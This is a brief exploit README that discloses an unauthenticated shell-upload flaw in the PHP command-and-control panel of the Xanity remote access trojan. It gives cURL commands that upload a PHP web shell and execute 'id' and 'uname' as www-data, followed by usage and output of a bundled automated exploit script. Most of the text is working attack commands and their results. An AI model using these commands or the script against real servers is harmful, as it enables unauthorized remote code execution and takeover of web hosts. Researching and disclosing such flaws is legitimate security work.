# TorCTPwn

I was having a look at the C&C panel of the [Xanity RAT](https://github.com/alienwithin/xanity-php-rat) for a bit of amusement, and noticed that it suffers an absurdly trivial shell upload vulnerability, outlined below.

See: [upload.php](https://github.com/alienwithin/xanity-php-rat/blob/master/server-files/upload.php) and note we can upload whatever the hell we want to a place with whatever name we want. Trivial shell upload with no auth or anything.

PoC using cURL:
```
$ curl -F name=lol.php -F file=@/tmp/lol.php http://localhost/upload.php?d=lol
1
$ curl http://localhost/lol/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ curl http://localhost/lol/lol.php?1=uname
Linux
$ 
```

For shits and giggles, there is also an automated exploit for this in this repo.
```
$ python xanity-pwn.py 
use: xanity-pwn.py http://xanity.skids/upload.php /your/shell.php
$ python xanity-pwn.py http://localhost/upload.php /tmp/lol.php 
[+] Shell Uploaded! It should be in: http://localhost/lol/lol.php
$ curl http://localhost/lol/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
